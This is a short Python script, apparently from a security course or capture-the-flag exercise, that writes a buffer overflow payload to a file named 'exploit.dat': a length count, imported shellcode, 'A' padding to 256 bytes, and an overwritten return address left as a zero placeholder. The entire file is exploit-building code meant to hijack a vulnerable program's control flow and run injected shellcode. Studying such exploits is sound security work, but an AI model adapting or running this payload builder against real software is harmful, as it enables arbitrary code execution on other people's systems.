from shellcode import shellcode
import struct

count = 128
padding = b"A" * (256 - len(shellcode))
return_address = struct.pack("<I", 0x00000000)

with open('exploit.dat', 'wb') as f:
    f.write(struct.pack("<I", count))
    f.write(shellcode + padding + return_address)